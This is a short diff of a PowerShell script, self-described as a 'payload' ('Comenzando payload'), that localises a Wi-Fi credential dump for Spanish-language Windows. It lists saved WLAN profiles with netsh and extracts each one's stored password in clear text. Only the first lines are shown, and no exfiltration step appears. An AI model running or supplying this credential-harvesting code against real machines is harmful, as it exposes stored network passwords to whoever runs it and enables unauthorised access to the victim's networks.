@@ -1,5 +1,5 @@
 Write-Output "Comenzando payload"
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 	Write-Output "WIFI "+$wlan
